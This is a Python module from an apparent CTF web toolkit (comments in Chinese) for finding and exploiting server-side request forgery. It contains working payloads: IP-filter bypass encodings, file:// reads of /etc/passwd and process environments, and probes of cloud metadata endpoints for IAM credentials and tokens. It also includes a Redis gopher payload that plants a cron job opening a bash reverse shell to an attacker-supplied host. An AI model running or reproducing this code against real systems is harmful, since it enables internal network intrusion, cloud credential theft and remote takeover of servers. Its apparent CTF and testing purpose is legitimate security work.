"""
CTF Web Toolkit - SSRF Detection & Exploitation Module
支持：内网探测 / 协议利用 / Bypass 技巧
"""

from typing import List, Optional
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 常用内网地址 ──────────────────────────────
INTERNAL_HOSTS = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "0",
    "::1",
    "169.254.169.254",           # AWS metadata
    "metadata.google.internal",  # GCP metadata
    "100.100.100.200",           # Alibaba Cloud metadata
    "192.168.0.1",
    "10.0.0.1",
    "172.16.0.1",
]

# ── 绕过 IP 过滤 ──────────────────────────────
BYPASS_127 = [
    "127.0.0.1",
    "127.1",
    "127.0.1",
    "0.0.0.0",
    "0",
    "localhost",
    "LOCALHOST",
    "LocalHost",
    "[::]",
    "[::1]",
    "127.0.0.1.nip.io",
    "0177.0.0.1",          # 八进制
    "0x7f.0x0.0x0.0x1",   # 十六进制
    "2130706433",          # 整数形式
    "0x7f000001",          # 整数十六进制
    "0177.00.00.01",       # 八进制混合
    "①②⑦.⓪.⓪.①",        # Unicode
    "127。0。0。1",         # 中文句号
]

# ── 协议列表 ──────────────────────────────────
PROTOCOLS = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "dict://127.0.0.1:22/",
    "dict://127.0.0.1:3306/",
    "dict://127.0.0.1:6379/",
    "gopher://127.0.0.1:_",
    "ftp://127.0.0.1/",
]

# ── 云环境 Metadata ───────────────────────────
CLOUD_METADATA = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "aliyun": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
}

# ── Redis Gopher Payload ──────────────────────
REDIS_GOPHER_REVERSE_SHELL = (
    "gopher://127.0.0.1:6379/_%0d%0a"
    "*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a"
    "$58%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/{ip}/{port} 0>&1%0a%0a%0a"
    "%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a"
    "$16%0d%0a/var/spool/cron%0d%0a"
    "*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a"
    "$4%0d%0aroot%0d%0a"
    "*1%0d%0a$4%0d%0asave%0d%0a"
)


class SSRFScanner:
    def __init__(self, requester: Requester, callback_host: str = ""):
        """
        callback_host: 你的 OAST/Interactsh 域名，用于检测无回显 SSRF
        """
        self.req = requester
        self.callback = callback_host

    def detect_basic(self, url: str, param: str, method: str = "GET") -> dict:
        """基础 SSRF 检测：检测内网地址是否被请求"""
        section(f"SSRF 基础检测: {param}")
        result = {"vulnerable": False, "payloads": []}

        for host in INTERNAL_HOSTS[:6]:
            for port in [80, 443, 8080, 22]:
                payload = f"http://{host}:{port}/"
                resp = _send(self.req, url, param, payload, method)
                if resp and _looks_internal(resp):
                    found("SSRF", f"{payload} -> status={resp.status_code} len={len(resp.text)}")
                    result["vulnerable"] = True
                    result["payloads"].append(payload)

        if not result["vulnerable"]:
            info("基础检测未发现 SSRF")
        return result

    def detect_file_read(self, url: str, param: str, method: str = "GET") -> Optional[str]:
        """尝试通过 file:// 协议读取本地文件"""
        section("SSRF file:// 协议读取")
        targets = [
            "file:///etc/passwd",
            "file:///etc/hostname",
            "file:///proc/self/environ",
            "file:///windows/win.ini",
        ]
        for target in targets:
            resp = _send(self.req, url, param, target, method)
            if resp and _is_file_content(resp.text):
                found("file:// 读取", target)
                return resp.text
        info("file:// 协议未读取到内容")
        return None

    def probe_ports(self, url: str, param: str, target_host: str = "127.0.0.1",
                    ports: Optional[List[int]] = None, method: str = "GET") -> List[int]:
        """通过 SSRF 探测内网端口"""
        section(f"端口探测: {target_host}")
        if ports is None:
            ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]
        open_ports = []

        # 获取关闭端口基线
        baseline_resp = _send(self.req, url, param,
                              f"http://{target_host}:11111/", method)
        baseline_len = len(baseline_resp.text) if baseline_resp else 0
        baseline_status = baseline_resp.status_code if baseline_resp else -1

        for port in ports:
            payload = f"http://{target_host}:{port}/"
            resp = _send(self.req, url, param, payload, method)
            if resp:
                diff = abs(len(resp.text) - baseline_len)
                if resp.status_code != baseline_status or diff > 50:
                    ok(f"  端口开放: {port} (status={resp.status_code}, diff={diff})")
                    open_ports.append(port)
                else:
                    info(f"  端口关闭: {port}")
        return open_ports

    def probe_cloud_metadata(self, url: str, param: str,
                             cloud: str = "aws", method: str = "GET") -> Optional[str]:
        """探测云环境 metadata"""
        section(f"云 Metadata 探测: {cloud}")
        endpoints = CLOUD_METADATA.get(cloud, [])
        for endpoint in endpoints:
            headers = {}
            if cloud == "gcp":
                headers["Metadata-Flavor"] = "Google"
            elif cloud == "azure":
                headers["Metadata"] = "true"
            resp = _send(self.req, url, param, endpoint, method, extra_headers=headers)
            if resp and resp.status_code == 200 and len(resp.text) > 10:
                found("Cloud Metadata", endpoint)
                return resp.text
        info("未发现云 metadata 暴露")
        return None

    def test_bypass(self, url: str, param: str, method: str = "GET") -> List[str]:
        """测试各种 127.0.0.1 绕过方式"""
        section("IP 过滤绕过测试")
        success = []
        for bypass in BYPASS_127:
            payload = f"http://{bypass}/"
            resp = _send(self.req, url, param, payload, method)
            if resp and _looks_internal(resp):
                found("绕过成功", bypass)
                success.append(bypass)
        return success

    def generate_redis_shell(self, ip: str, port: int) -> str:
        """生成 Redis Gopher 反弹 shell Payload"""
        return REDIS_GOPHER_REVERSE_SHELL.format(ip=ip, port=port)

    def generate_gopher_http(self, target_host: str, target_port: int,
                             http_path: str = "/", extra_headers: str = "") -> str:
        """构造 Gopher 协议发送 HTTP 请求"""
        http_req = (
            f"GET {http_path} HTTP/1.1\r\n"
            f"Host: {target_host}:{target_port}\r\n"
            f"{extra_headers}"
            f"Connection: close\r\n\r\n"
        )
        encoded = "".join(f"%{ord(c):02x}" for c in http_req)
        return f"gopher://{target_host}:{target_port}/_{encoded}"


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str, payload: str,
          method: str, extra_headers: dict = None):
    try:
        kwargs = {}
        if extra_headers:
            kwargs["headers"] = extra_headers
        if method.upper() == "GET":
            return req.get(url, params={param: payload}, **kwargs)
        else:
            return req.post(url, data={param: payload}, **kwargs)
    except Exception as e:
        err(f"请求失败: {e}")
        return None


def _looks_internal(resp) -> bool:
    """判断响应是否来自内网（非拒绝连接）"""
    if resp.status_code in [200, 301, 302, 401, 403, 500]:
        return True
    return False


def _is_file_content(text: str) -> bool:
    indicators = ["root:x:", "nobody:", "[extensions]", "localhost", "127.0.0.1", "PATH="]
    return any(i in text for i in indicators)
